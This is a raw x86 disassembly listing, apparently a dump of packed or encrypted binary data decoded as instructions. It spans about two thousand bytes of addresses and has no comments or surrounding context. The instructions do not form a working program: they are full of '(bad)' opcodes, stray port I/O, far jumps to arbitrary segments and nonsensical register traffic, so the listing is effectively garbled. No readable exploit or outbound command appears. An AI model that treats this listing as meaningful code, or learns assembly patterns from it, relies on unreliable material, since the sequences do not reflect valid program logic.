  4143e8:	aad    0x67
  4143ea:	cmp    dh,0x11
  4143ed:	fs dec ecx
  4143ef:	pop    edx
  4143f0:	push   esi
  4143f1:	gs fs sub eax,0x993c951b
  4143f8:	daa    
  4143f9:	daa    
  4143fa:	or     ah,bl
  4143fc:	inc    edx
  4143fd:	in     eax,0x18
  4143ff:	mov    bh,0x9
  414402:	mov    ch,BYTE PTR [eax-0x17d72648]
  414408:	jle    0x41447b
  41440a:	pop    esi
  41440b:	es xchg ebp,eax
  41440d:	popa   
  41440e:	adc    esi,edi
  414410:	(bad)  
  414411:	scas   eax,DWORD PTR es:[edi]
  414412:	pop    es
  414413:	push   es
  414414:	dec    edi
  414415:	pop    ss
  414416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414417:	retf   
  414418:	vpavgb ymm7,ymm5,YMMWORD PTR [edx+0x18076424]
  414420:	add    DWORD PTR [ebx],0xffffffb8
  414423:	mov    eax,ds:0x8561abb3
  414428:	jo     0x4143d1
  41442a:	xchg   cl,dl
  41442c:	out    0x98,eax
  41442e:	sub    al,0xea
  414430:	cld    
  414431:	(bad)  
  414432:	sbb    cl,BYTE PTR [esi+0x2d]
  414435:	inc    esp
  414436:	or     al,0xb9
  414438:	inc    esi
  414439:	test   eax,0xfeab8619
  41443e:	jg     0x4143c7
  414440:	das    
  414441:	xchg   ebx,eax
  414442:	scas   eax,DWORD PTR es:[edi]
  414443:	and    eax,0x5b80f5fd
  414448:	inc    ebx
  414449:	int3   
  41444a:	mov    esi,DWORD PTR [esp+edx*2-0x4]
  41444e:	fidivr WORD PTR [esi-0x1067c4c7]
  414454:	pushf  
  414455:	xchg   esi,eax
  414456:	cmp    al,0x83
  414458:	sbb    BYTE PTR [eax-0x4fd1bd30],al
  41445e:	adc    al,ch
  414460:	arpl   WORD PTR [edi-0x6e],si
  414463:	test   DWORD PTR [ecx-0xe],edx
  414466:	inc    edx
  414467:	ret    
  414468:	or     BYTE PTR [edx],dh
  41446a:	mov    eax,0xb0de3656
  41446f:	bound  ebx,QWORD PTR [edi+0x7ca69f55]
  414475:	dec    eax
  414476:	(bad)  
  414477:	into   
  414478:	jle    0x4144e9
  41447a:	jmp    0x41443e
  41447c:	fidivr WORD PTR [eax+edi*1]
  41447f:	ins    DWORD PTR es:[edi],dx
  414480:	test   DWORD PTR [esi+0x5d3d69ef],eax
  414486:	add    ebp,edx
  414488:	cmc    
  414489:	fchs   
  41448b:	and    al,BYTE PTR [ebx+0x78]
  41448e:	das    
  41448f:	xlat   BYTE PTR ds:[ebx]
  414490:	mov    bl,0x66
  414492:	push   edx
  414493:	cmp    eax,0x1e039e75
  414498:	ins    BYTE PTR es:[edi],dx
  414499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41449a:	mov    al,dh
  41449c:	in     al,0x3e
  41449e:	cmp    DWORD PTR [edx],ebx
  4144a0:	inc    edx
  4144a1:	popf   
  4144a2:	mov    al,0x1e
  4144a4:	dec    esp
  4144a5:	lock (bad) 
  4144a7:	pop    esp
  4144a8:	imul   eax,DWORD PTR [ecx-0x4f6cf302],0x74
  4144af:	addr16 ss push cs
  4144b2:	xchg   BYTE PTR [ecx-0x64e654ad],cl
  4144b8:	jae    0x414465
  4144ba:	pop    eax
  4144bb:	xor    al,0x87
  4144bd:	fdivrp st(1),st
  4144bf:	ret    
  4144c0:	leave  
  4144c1:	mov    al,ds:0xa926996
  4144c6:	(bad)  
  4144c7:	pop    edi
  4144c8:	sbb    dl,BYTE PTR [edx]
  4144ca:	and    DWORD PTR [eax+0x78f61404],edx
  4144d0:	mov    bl,0x57
  4144d2:	add    edi,DWORD PTR [edi-0x4f]
  4144d5:	clc    
  4144d6:	jmp    0x4144d6
  4144d8:	jge    0x41451a
  4144da:	xchg   DWORD PTR [esi+0x283a8147],ecx
  4144e0:	dec    edx
  4144e1:	pop    ds
  4144e2:	push   ecx
  4144e3:	jg     0x4144b7
  4144e5:	pop    ss
  4144e6:	out    0xca,al
  4144e8:	xor    DWORD PTR [ecx-0x7b309161],eax
  4144ee:	pop    es
  4144ef:	ret    0x3330
  4144f2:	jnp    0x41447b
  4144f4:	scas   al,BYTE PTR es:[edi]
  4144f5:	pop    esi
  4144f6:	xchg   esp,eax
  4144f7:	jmp    0x2f2a:0x844124ad
  4144fe:	lods   al,BYTE PTR ds:[esi]
  4144ff:	sbb    ch,ah
  414501:	push   ds
  414502:	mov    DWORD PTR [ebp-0x3907b46b],esi
  414508:	int3   
  414509:	aam    0x41
  41450b:	loope  0x4144a9
  41450d:	jmp    0xf775a07a
  414512:	sub    eax,0xfcf076b1
  414517:	not    BYTE PTR [eax+0x8a63fe6]
  41451d:	popa   
  41451e:	aas    
  41451f:	add    DWORD PTR [ebp+0x4b],0xcf227fd1
  414526:	xchg   ecx,eax
  414527:	adc    eax,0xe774436a
  41452c:	mov    ecx,0xe49ea425
  414531:	les    ecx,FWORD PTR [eax-0xa147f80]
  414537:	in     eax,0x9a
  414539:	dec    ebx
  41453a:	xchg   BYTE PTR [edi+0x33d639fd],ch
  414540:	stos   DWORD PTR es:[edi],eax
  414541:	lds    esi,FWORD PTR [eax]
  414543:	cmp    dh,ch
  414545:	jne    0x41451c
  414547:	pop    esi
  414548:	jmp    0x4144cf
  41454a:	cmp    edx,ecx
  41454c:	test   eax,0x4e0c0d6a
  414551:	mov    al,0x3f
  414553:	fld    QWORD PTR [esi+0x65]
  414556:	arpl   bp,cx
  414558:	mov    ebx,0xef14de93
  41455d:	cs inc edx
  41455f:	xchg   ebx,eax
  414560:	push   0x8049017c
  414565:	push   esp
  414566:	pop    edx
  414567:	cwde   
  414568:	add    DWORD PTR [ebx+0x144fd82],edx
  41456e:	mov    ch,0xb6
  414570:	ror    BYTE PTR [ebx+0xe44c5a9],cl
  414576:	jle    0x414589
  414578:	mov    ecx,0x68594f50
  41457d:	into   
  41457e:	dec    edx
  41457f:	mov    edx,0x4334201a
  414584:	mov    edi,0xbc8db7f2
  414589:	adc    eax,0x449a6c69
  41458e:	scas   al,BYTE PTR es:[edi]
  41458f:	inc    edi
  414590:	ds out dx,al
  414592:	out    0xbe,eax
  414594:	mov    ss,WORD PTR [ebx]
  414596:	fld    DWORD PTR [esp+eax*4+0x79950611]
  41459d:	(bad)  
  41459f:	fdiv   DWORD PTR [ecx-0x5f]
  4145a3:	into   
  4145a4:	sahf   
  4145a5:	test   BYTE PTR [ebp-0x1b7c3be3],bl
  4145ab:	in     al,dx
  4145ac:	inc    ebx
  4145ad:	sub    al,0x94
  4145af:	js     0x41461a
  4145b1:	ja     0x41460a
  4145b3:	mov    ds,esi
  4145b5:	dec    edi
  4145b6:	ret    
  4145b7:	(bad)  
  4145b8:	pop    edx
  4145b9:	(bad)  
  4145ba:	xchg   DWORD PTR [eax+0x7f],ebp
  4145bd:	enter  0xebc0,0x56
  4145c1:	adc    DWORD PTR [esi+0x6da3ab9],esp
  4145c7:	clc    
  4145c8:	xor    DWORD PTR [edx-0x48],esp
  4145cb:	adc    DWORD PTR [edx-0x4a],ecx
  4145ce:	sub    BYTE PTR ds:0xfcf77713,al
  4145d4:	jns    0x4145fa
  4145d6:	jge    0x41459b
  4145d8:	lea    ebp,[eax]
  4145da:	adc    bl,al
  4145dc:	das    
  4145dd:	ins    DWORD PTR es:[edi],dx
  4145de:	lods   eax,DWORD PTR ds:[esi]
  4145df:	adc    bl,BYTE PTR [eax+0x1db2ca69]
  4145e5:	jae    0x4145ed
  4145e7:	rcl    BYTE PTR [ecx-0x57],0x71
  4145eb:	pop    edx
  4145ec:	mov    ds:0xe412649,al
  4145f1:	leave  
  4145f2:	cs inc ebp
  4145f4:	cmp    eax,0x43d0c96e
  4145f9:	jp     0x4145a9
  4145fb:	inc    edi
  4145fc:	or     al,0xba
  4145fe:	sub    al,0xc0
  414600:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414602:	rol    BYTE PTR es:[ebx+0x787c53ff],cl
  414609:	sub    eax,0x75740777
  41460e:	mov    esp,0xc8576f3b
  414613:	pop    ebx
  414614:	ins    DWORD PTR es:[edi],dx
  414615:	imul   ecx,DWORD PTR [eax+0x3f7a310],0xcfb907a
  41461f:	into   
  414620:	xlat   BYTE PTR ds:[ebx]
  414621:	xor    al,0x3e
  414623:	adc    eax,0x23a363f7
  414628:	repz push ecx
  41462a:	adc    al,BYTE PTR [edx+0x18]
  41462d:	push   edx
  41462e:	nop
  41462f:	cmp    al,0xb0
  414631:	test   BYTE PTR ds:0x6a0d,al
  414636:	stos   BYTE PTR es:[edi],al
  414637:	mov    ds:0x6af0eae,al
  41463c:	inc    esi
  41463d:	pop    ds
  41463e:	xor    DWORD PTR [eax-0x72],ecx
  414641:	jno    0x41464b
  414643:	dec    esp
  414644:	adc    al,ah
  414646:	gs pcmpeqb mm1,QWORD PTR cs:[edi+0x279d695f]
  41464f:	jecxz  0x4146c6
  414651:	cwde   
  414652:	add    DWORD PTR [edx],esi
  414654:	loopne 0x414664
  414656:	jl     0x4145f3
  414658:	mov    ecx,0x6ea846df
  41465d:	(bad)  
  41465e:	and    BYTE PTR [edi+0x66],ah
  414661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414662:	jge    0x4145ec
  414664:	xchg   ecx,eax
  414665:	je     0x41465f
  414667:	jp     0x41460e
  414669:	sbb    eax,0x12593354
  41466e:	ret    
  41466f:	or     cl,BYTE PTR [eax]
  414671:	mov    ds:0xbfb05623,al
  414676:	jne    0x4146e9
  414678:	cmp    BYTE PTR [eax+0x3d],ch
  41467b:	sub    eax,0x358e7287
  414680:	push   edi
  414681:	lea    ebx,[ecx+0x3b3f4b3d]
  414687:	call   0xa629:0xecc7da9d
  41468e:	stos   BYTE PTR es:[edi],al
  41468f:	jne    0x414709
  414691:	lahf   
  414692:	(bad)  
  414694:	not    DWORD PTR [eax]
  414696:	jecxz  0x41462d
  414698:	cli    
  414699:	test   DWORD PTR [esi],ebx
  41469b:	dec    ecx
  41469c:	add    esp,DWORD PTR [edi+0x4a]
  41469f:	push   ds
  4146a0:	dec    eax
  4146a1:	mov    ebx,0xd6315c71
  4146a6:	pop    ecx
  4146a8:	adc    BYTE PTR [edi+0x4b],ch
  4146ab:	sar    BYTE PTR [edx+edi*1+0x192cb8d0],1
  4146b2:	fprem  
  4146b4:	mov    ecx,0xd5b32310
  4146b9:	mov    al,ds:0xa9a58324
  4146be:	fist   DWORD PTR [ebp+0x44]
  4146c1:	xor    eax,0x65fd0b84
  4146c6:	sbb    eax,DWORD PTR [eax+0xb906b6e]
  4146cc:	jl     0x41470e
  4146ce:	push   edx
  4146cf:	dec    ebp
  4146d0:	aas    
  4146d1:	icebp  
  4146d2:	xor    esi,DWORD PTR [ecx-0x37]
  4146d5:	ds pop ebp
  4146d7:	bound  ebx,QWORD PTR [ecx+0x75d887f5]
  4146dd:	std    
  4146de:	jmp    0xec23:0xb54d2ff8
  4146e5:	pop    esi
  4146e6:	fcmovnbe st,st(2)
  4146e8:	clc    
  4146e9:	push   eax
  4146ea:	pop    eax
  4146eb:	mov    BYTE PTR [esi+0x3447b126],0xce
  4146f2:	lahf   
  4146f3:	daa    
  4146f4:	loopne 0x4146ea
  4146f6:	sub    bl,ah
  4146f8:	aam    0xf9
  4146fa:	in     eax,dx
  4146fb:	stos   BYTE PTR es:[edi],al
  4146fc:	push   ss
  4146fd:	out    0xbb,eax
  4146ff:	jecxz  0x41474d
  414701:	fmul   QWORD PTR [esi+0x318603da]
  414707:	xchg   edi,eax
  414708:	mov    edi,0x7ed80d2a
  41470d:	or     esi,edi
  41470f:	add    BYTE PTR [ecx+0x67cfac09],cl
  414715:	jp     0x414724
  414717:	repnz cli 
  414719:	pop    ss
  41471a:	test   DWORD PTR ds:0x1aa3daaf,edx
  414720:	dec    edi
  414721:	sbb    DWORD PTR [esi+0x66cf5a7d],edx
  414727:	cdq    
  414728:	sbb    BYTE PTR [ebp+0xe],0x3a
  41472c:	fsub   QWORD PTR [ebp-0x71]
  41472f:	das    
  414730:	adc    DWORD PTR [edi-0x36],ebx
  414733:	push   0xffffffe0
  414735:	test   esp,eax
  414737:	or     ecx,edi
  414739:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  41473d:	or     BYTE PTR [eax],cl
  41473f:	shl    edx,0x1e
  414742:	mov    edx,DWORD PTR [esi]
  414744:	mov    ecx,DWORD PTR [esi+0x4]
  414747:	jmp    0x414cd1
  41474c:	arpl   WORD PTR [edx-0x67eb5a1b],bx
  414752:	and    esp,DWORD PTR [eax]
  414754:	stos   DWORD PTR es:[edi],eax
  414755:	sub    eax,eax
  414757:	scas   al,BYTE PTR es:[edi]
  414758:	or     al,0xa0
  41475a:	mov    ah,0x72
  41475c:	outs   dx,DWORD PTR ds:[esi]
  41475d:	fisttp QWORD PTR [esi+edx*1]
  414760:	cmp    eax,0xda161604
  414765:	sub    esi,DWORD PTR [edi-0x24]
  414768:	adc    eax,0xc5eb1499
  41476d:	ins    BYTE PTR es:[edi],dx
  41476e:	lahf   
  41476f:	adc    dl,BYTE PTR fs:[edi+esi*2-0x5ecbefe9]
  414777:	fiadd  DWORD PTR [edi+eiz*2+0x1ce2d227]
  41477e:	rol    BYTE PTR [ecx],cl
  414780:	adc    eax,0xa7531938
  414785:	cmc    
  414786:	lods   al,BYTE PTR ds:[esi]
  414787:	cli    
  414788:	dec    esp
  414789:	xchg   ecx,eax
  41478a:	dec    eax
  41478b:	pop    ss
  41478c:	test   eax,0x1c038493
  414791:	lds    edx,FWORD PTR cs:[ebp-0x59b3ab21]
  414798:	ds dec esi
  41479a:	add    eax,0xea8f9b8d
  41479f:	push   esp
  4147a0:	mov    ecx,0xb57083f1
  4147a5:	jg     0x4147ae
  4147a7:	mov    ds:0xaff1be04,al
  4147ac:	lock and al,0x9a
  4147af:	aam    0xc2
  4147b1:	fstp   TBYTE PTR [ebx]
  4147b3:	push   ebp
  4147b4:	push   edx
  4147b5:	inc    esp
  4147b6:	dec    esi
  4147b7:	outs   dx,BYTE PTR ds:[esi]
  4147b8:	inc    eax
  4147b9:	inc    edi
  4147ba:	int    0xf6
  4147bc:	sbb    dh,BYTE PTR [ebp+0x49]
  4147bf:	sbb    esi,0x182ef6b5
  4147c5:	imul   edx,DWORD PTR [ecx+0x47],0xffffffa1
  4147c9:	xor    dl,BYTE PTR [edx+esi*1]
  4147cc:	retf   
  4147cd:	add    ebx,DWORD PTR [esi-0x6d]
  4147d0:	adc    eax,0x75eb2be7
  4147d5:	outs   dx,DWORD PTR ds:[esi]
  4147d6:	scas   eax,DWORD PTR es:[edi]
  4147d7:	mov    cl,BYTE PTR [edx+0x39]
  4147da:	mov    cl,0xf5
  4147dc:	mov    ch,0xcd
  4147de:	add    eax,0x240cf7fa
  4147e3:	cmp    bl,ch
  4147e5:	out    0x5,eax
  4147e7:	or     esp,DWORD PTR [eax-0x41]
  4147ea:	es ss (bad) 
  4147ee:	jae    0x41483b
  4147f0:	imul   edx,DWORD PTR [esi],0xaf2981a5
  4147f6:	inc    DWORD PTR [edi+eax*1]
  4147f9:	pusha  
  4147fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147fb:	loopne 0x4147a9
  4147fd:	mov    al,ds:0xe557a57b
  414802:	pop    eax
  414803:	loopne 0x414792
  414805:	sub    ah,ah
  414807:	push   0x3d
  414809:	call   FWORD PTR [eax+0x45]
  41480c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41480d:	fwait
  41480e:	(bad)  
  41480f:	inc    BYTE PTR [edx+0x76]
  414812:	or     al,0xff
  414814:	add    eax,0x71b87480
  414819:	mov    ds:0x5380507c,eax
  41481e:	mov    edi,0xc34ba2c1
  414823:	jno    0x414849
  414825:	push   ebp
  414826:	nop
  414827:	pop    ss
  414828:	pop    edi
  414829:	sub    dh,BYTE PTR [eax-0x7f0b4910]
  41482f:	jae    0x41480e
  414831:	jb     0x4148a0
  414833:	xchg   esp,eax
  414834:	daa    
  414835:	jmp    0x41ad9b69
  41483a:	and    ecx,esi
  41483c:	cmp    BYTE PTR [ebx+edi*2-0x6c3e37d],dh
  414843:	push   0x58
  414845:	(bad)  
  414846:	mov    al,ds:0x5a990065
  41484b:	mov    cl,0x19
  41484d:	(bad)  
  41484e:	sbb    ecx,DWORD PTR [ebx]
  414850:	call   0x5d19:0xcfc3a9df
  414857:	fild   WORD PTR [edi+ebx*4+0x3b39b57e]
  41485e:	inc    ecx
  41485f:	mov    eax,ds:0xf4d90be1
  414864:	mov    edx,0xdda760f5
  414869:	icebp  
  41486a:	(bad)  
  41486b:	retf   0x244b
  41486e:	dec    esi
  41486f:	fst    DWORD PTR [ebx]
  414871:	add    DWORD PTR [edx+0x6f],esp
  414874:	cwde   
  414875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414876:	push   edi
  414877:	xchg   esp,edi
  414879:	jns    0x4148e4
  41487b:	fnstsw WORD PTR [esi-0x566c6283]
  414881:	fidivr WORD PTR [edi+0x61fe5877]
  414887:	push   esi
  414889:	adc    bh,BYTE PTR [eax+0x62babf87]
  41488f:	imul   ecx,esi,0x35
  414892:	jae    0x4148fd
  414894:	mov    cl,0x6d
  414896:	xchg   esp,eax
  414897:	push   0xba377946
  41489c:	mov    ebp,0xf516603b
  4148a1:	rcr    DWORD PTR ds:0x462ea1d6,cl
  4148a7:	jbe    0x41489b
  4148a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148aa:	mov    dl,BYTE PTR [edi-0x49]
  4148ad:	je     0x414896
  4148af:	test   BYTE PTR [ebp+0x7eb33f2a],dl
  4148b5:	mov    WORD PTR ds:0x7414333,?
  4148bb:	lods   al,BYTE PTR ds:[esi]
  4148bc:	push   edi
  4148bd:	pusha  
  4148be:	int3   
  4148bf:	jmp    0x94a64401
  4148c4:	test   al,0xb0
  4148c6:	jecxz  0x414941
  4148c8:	cmp    BYTE PTR [ecx],bl
  4148ca:	(bad)  
  4148cb:	sbb    al,0x27
  4148cd:	leave  
  4148ce:	push   ecx
  4148cf:	jbe    0x414908
  4148d1:	mov    ah,0xf9
  4148d3:	mov    ds,edx
  4148d5:	xchg   DWORD PTR [ebx],eax
  4148d7:	sbb    BYTE PTR [edx-0x6791f6f7],0x60
  4148de:	lods   eax,DWORD PTR fs:[esi]
  4148e0:	jmp    0x414882
  4148e2:	mov    eax,0x3a8fafbe
  4148e7:	mov    edi,0x7b1dd627
  4148ec:	fild   WORD PTR [edx+0x205656b5]
  4148f2:	inc    edx
  4148f3:	mov    ch,0x2b
  4148f5:	(bad)  
  4148f6:	idiv   DWORD PTR [ecx+0x1f6ff704]
  4148fc:	les    ebp,FWORD PTR [ebp+0x380ab151]
  414902:	call   0x9ed5:0x2a787a01
  414909:	mov    cl,0x42
  41490b:	pop    ss
  41490c:	inc    esp
  41490d:	jo     0x4148b8
  41490f:	add    al,0xf2
  414911:	add    al,ch
  414913:	jp     0x4148cf
  414915:	mov    cs,WORD PTR [edx+0x24]
  414918:	jne    0x414971
  41491a:	cdq    
  41491b:	push   ebp
  41491c:	mov    dh,BYTE PTR [eax]
  41491e:	mov    dh,0x7f
  414920:	cld    
  414921:	xchg   edx,eax
  414922:	pop    esp
  414923:	cli    
  414924:	pop    eax
  414925:	sti    
  414926:	pop    ss
  414927:	das    
  414928:	sar    BYTE PTR [eax+0xb47a1fc],cl
  41492e:	push   0xea6ca5cd
  414933:	push   ecx
  414934:	into   
  414935:	test   BYTE PTR [ebp+0x67ec129b],ah
  41493b:	or     al,0xa3
  41493d:	jg     0x414915
  41493f:	sub    ch,BYTE PTR [esi]
  414941:	sub    al,0xc9
  414943:	call   0x994c637d
  414948:	js     0x4148e2
  41494a:	dec    ebp
  41494b:	mov    al,ds:0x14f63cad
  414950:	lahf   
  414951:	sbb    edx,eax
  414953:	lea    ebx,[ebx+0x32]
  414956:	in     eax,0xd9
  414958:	stos   DWORD PTR es:[edi],eax
  414959:	cdq    
  41495a:	in     al,dx
  41495b:	inc    esi
  41495c:	fisub  DWORD PTR [esi]
  41495e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41495f:	jmp    0x414955
  414961:	mov    ecx,DWORD PTR [eax-0x31c0c59d]
  414967:	fcom   DWORD PTR [esi+0x4e6b3236]
  41496d:	mov    DWORD PTR [eax+0x4eacef05],esi
  414973:	dec    edx
  414974:	adc    BYTE PTR [ecx-0x74],0x5e
  414978:	loope  0x414910
  41497a:	inc    edx
  41497b:	jle    0x4149de
  41497d:	jg     0x4149c7
  41497f:	inc    ebp
  414980:	inc    esi
  414981:	xchg   ebp,eax
  414982:	shl    DWORD PTR [ebx-0x1689b020],1
  414988:	pop    esp
  414989:	mov    eax,ds:0x82c5fbb7
  41498e:	sub    bl,BYTE PTR [edi+ebx*4]
  414991:	pop    esi
  414992:	and    eax,0xa1896f1d
  414997:	sub    DWORD PTR [eax],ecx
  414999:	ds pop es
  41499b:	loope  0x414944
  41499d:	addr16 div ebx
  4149a0:	and    al,0xb
  4149a2:	fild   QWORD PTR [ebp+0x276f965a]
  4149a8:	outs   dx,BYTE PTR ds:[esi]
  4149a9:	arpl   bx,sp
  4149ab:	jge    0x4149b0
  4149ad:	jbe    0x414a2d
  4149af:	push   ebp
  4149b0:	mov    edi,0x2decf8d3
  4149b5:	mov    cl,0x9d
  4149b7:	sbb    al,0x0
  4149b9:	fldcw  WORD PTR [edx]
  4149bb:	outs   dx,BYTE PTR ds:[esi]
  4149bc:	sub    edx,DWORD PTR [ebx-0x1b]
  4149bf:	std    
  4149c0:	arpl   WORD PTR [esi*4-0x61f57697],bp
  4149c7:	xor    ah,BYTE PTR [edx]
  4149c9:	aad    0x9d
  4149cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149cc:	rcl    DWORD PTR [ebx-0x32],0xd8
  4149d0:	mov    esp,0xd677c6d1
  4149d5:	int3   
  4149d6:	cwde   
  4149d7:	sbb    eax,DWORD PTR [esi+ebp*2]
  4149da:	es hlt 
  4149dc:	inc    esp
  4149dd:	arpl   WORD PTR [edx+0x70],dx
  4149e0:	mov    ch,0xbe
  4149e2:	dec    ebx
  4149e3:	xchg   edx,eax
  4149e4:	mov    ds:0xb7243f3f,al
  4149e9:	push   ds
  4149ea:	jmp    0xcf9b4c02
  4149ef:	jl     0x4149a7
  4149f1:	adc    eax,0x5bef680a
  4149f6:	lds    edx,FWORD PTR [edx+0x585b2b12]
  4149fc:	pop    ss
  4149fd:	mov    edx,0xa810f1e7
  414a02:	push   ss
  414a03:	test   DWORD PTR [ecx+0x75544de1],edi
  414a09:	jge    0x414a6d
  414a0b:	in     eax,dx
  414a0c:	out    dx,eax
  414a0d:	(bad)  
  414a0e:	std    
  414a0f:	and    al,0xa2
  414a11:	add    eax,0x38586388
  414a16:	repnz xchg esi,eax
  414a18:	retf   
  414a19:	fwait
  414a1a:	xchg   edi,eax
  414a1b:	mov    eax,ds:0x5353d12d
  414a20:	sub    bh,BYTE PTR [edx]
  414a22:	sbb    eax,0x50313bb4
  414a27:	jo     0x414a90
  414a29:	int3   
  414a2a:	popf   
  414a2b:	xchg   DWORD PTR [esp+edi*2-0x286fcffb],edx
  414a32:	ret    0xe07b
  414a35:	retf   
  414a36:	jb     0x414a7b
  414a38:	inc    eax
  414a39:	in     al,0xf1
  414a3b:	or     al,dl
  414a3d:	lea    esp,[edi+0x5d]
  414a40:	sbb    BYTE PTR [esi-0x15f49dd],dl
  414a46:	(bad)  
  414a47:	sbb    bh,BYTE PTR [eax+0x1eaee22c]
  414a4d:	aas    
  414a4e:	cmc    
  414a4f:	push   esi
  414a50:	bound  eax,QWORD PTR [ebx-0x44eb8f90]
  414a56:	adc    ebx,DWORD PTR [ebp-0x16f604a4]
  414a5c:	das    
  414a5d:	int3   
  414a5e:	daa    
  414a5f:	sbb    eax,0x521fae1a
  414a64:	dec    ecx
  414a65:	test   eax,0xa2c8c09a
  414a6a:	ret    
  414a6b:	mov    ds:0xe5a096ca,eax
  414a70:	leave  
  414a71:	jo     0x414ad5
  414a73:	jmp    0x414aab
  414a75:	xchg   esp,eax
  414a76:	pop    edi
  414a77:	rol    DWORD PTR [esi-0x656d7918],1
  414a7d:	out    dx,eax
  414a7e:	call   0xb9afe382
  414a83:	pop    esi
  414a84:	in     eax,0x87
  414a86:	xor    ax,0x55bf
  414a8a:	pop    edx
  414a8b:	scas   al,BYTE PTR es:[edi]
  414a8c:	outs   dx,DWORD PTR ds:[esi]
  414a8d:	pop    ds
  414a8e:	and    BYTE PTR [ebx-0x4d],ah
  414a91:	ret    
  414a92:	(bad)  
  414a93:	xlat   BYTE PTR ds:[ebx]
  414a94:	fs add eax,0xcbc5b8c4
  414a9a:	add    eax,DWORD PTR [ecx*4-0xc58b742]
  414aa1:	in     al,dx
  414aa2:	push   ebx
  414aa3:	out    dx,al
  414aa4:	dec    ebx
  414aa5:	or     BYTE PTR [eax],bl
  414aa7:	mov    eax,0x1895b162
  414aac:	dec    ebx
  414aad:	addr16 in al,0xc7
  414ab0:	in     eax,0x31
  414ab2:	scas   al,BYTE PTR es:[edi]
  414ab3:	xchg   esp,eax
  414ab4:	cmp    eax,0x928eda48
  414ab9:	jle    0x414ae8
  414abb:	loope  0x414a53
  414abd:	xchg   esi,eax
  414abe:	shl    al,cl
  414ac0:	cdq    
  414ac1:	xlat   BYTE PTR ds:[ebx]
  414ac2:	adc    edx,esp
  414ac4:	adc    dl,BYTE PTR [eax-0x599e8b83]
  414aca:	mov    esp,0xe57e0304
  414acf:	out    0xc5,al
  414ad1:	dec    eax
  414ad2:	push   ecx
  414ad4:	mov    bl,0x16
  414ad6:	sbb    DWORD PTR [edx-0x59],esp
  414ad9:	dec    edi
  414ada:	popa   
  414adb:	ret    0x5301
  414ade:	jb     0x414ab7
  414ae0:	or     esi,DWORD PTR [ebp+0x6bd62d31]
  414ae6:	sub    ecx,DWORD PTR [ebx-0x34]
  414ae9:	mov    ebp,0xdf6f026b
  414aee:	mov    ebx,0x6ff5acf5
  414af3:	push   0xe41e3d8b
  414af8:	push   esp
  414af9:	and    bh,dl
  414afb:	fwait
  414afc:	push   ecx
  414afd:	inc    ebp
  414afe:	pusha  
  414aff:	pop    esp
  414b00:	jp     0x414b5d
  414b02:	jle    0x414a95
  414b04:	or     al,0xb
  414b06:	ret    
  414b07:	xchg   esi,eax
  414b08:	sar    DWORD PTR [edi+edi*8],1
  414b0b:	mov    esp,0xa7c32d51
  414b10:	cmp    ebp,DWORD PTR [ebp+0x374b9830]
  414b16:	xchg   ecx,eax
  414b17:	loope  0x414ac6
  414b19:	pop    ds
  414b1a:	(bad)  
  414b1b:	cmp    eax,0x31c39e5
  414b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b21:	add    DWORD PTR [edx],0x6e
  414b24:	dec    esp
  414b25:	enter  0x3cab,0x9f
  414b29:	pop    ebp
  414b2a:	xor    al,0x2d
  414b2c:	or     DWORD PTR [eax+0x1f],0xfffffff1
  414b30:	sbb    BYTE PTR [edi-0x4bf98364],bh
  414b36:	outs   dx,DWORD PTR ds:[esi]
  414b37:	stos   BYTE PTR es:[edi],al
  414b38:	call   0x14fa:0x283ea320
  414b3f:	sub    edi,DWORD PTR [eax]
  414b41:	mov    bl,0xcc
  414b43:	out    0x7b,eax
  414b45:	add    eax,0x58b003af
  414b4a:	mov    ds:0x815a7cb2,eax
  414b4f:	pop    edx
  414b50:	inc    ebp
  414b51:	mov    ebp,0xf865f30c
  414b56:	inc    edx
  414b57:	mov    eax,ds:0x2ebc2160
  414b5c:	sbb    DWORD PTR [eax-0x30],esp
  414b5f:	xor    eax,0x346ec3b1
  414b64:	sbb    eax,0x3a03b886
  414b69:	and    al,dl
  414b6b:	dec    eax
  414b6c:	xchg   ecx,eax
  414b6d:	lfs    ebx,FWORD PTR [esi-0x24]
  414b71:	enter  0xdf4d,0x4d
  414b75:	frstor [eax-0x77462f11]
  414b7b:	xchg   ebp,eax
  414b7c:	xchg   ecx,eax
  414b7d:	fidivr DWORD PTR [esp+edx*8+0x3934641f]
  414b84:	loope  0x414bed
  414b86:	outs   dx,DWORD PTR ds:[esi]
  414b87:	imul   edx,DWORD PTR [ecx+eiz*1+0x38ca6de1],0xffffffd6
  414b8f:	mov    ch,0x91
  414b91:	enter  0x619d,0x1f
  414b95:	cmp    DWORD PTR [ebp+0x43],ecx
  414b98:	aad    0xee
  414b9a:	mov    bh,0x25
  414b9c:	mov    edi,0x35412080
  414ba1:	es xchg esp,eax
  414ba3:	in     al,dx
  414ba4:	cmp    DWORD PTR [esi+0x45c4480],edi
  414baa:	pop    ds
  414bab:	jg     0x414bd7
  414bad:	mov    al,cl
  414baf:	jle    0x414b8a
  414bb1:	jl     0x414bfa
  414bb3:	jp     0x414bd6
  414bb5:	fist   DWORD PTR [esi+esi*1+0x50cb80f8]
  414bbc:	cld    
  414bbd:	push   eax
  414bbe:	sbb    edx,DWORD PTR [edi-0x2c]
  414bc1:	pusha  
  414bc2:	adc    BYTE PTR [esp+ebp*2-0x3],0x88
  414bc7:	sbb    al,0x37
  414bc9:	ja     0x414b4b
  414bcb:	pop    es
  414bcc:	pop    edx
  414bce:	sub    ebx,esp
  414bd0:	add    edi,DWORD PTR [ecx+0x3ca3219f]
  414bd6:	dec    ebp
  414bd7:	push   ss
  414bd8:	bound  ecx,QWORD PTR [eax]
  414bda:	out    dx,al
  414bdb:	mov    ebp,0xce428ef7
  414be0:	add    ecx,ebx
  414be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414be3:	add    DWORD PTR [ebx],0x4305876a
  414be9:	cwde   
  414bea:	jnp    0x414b7e
  414bec:	xchg   esi,eax
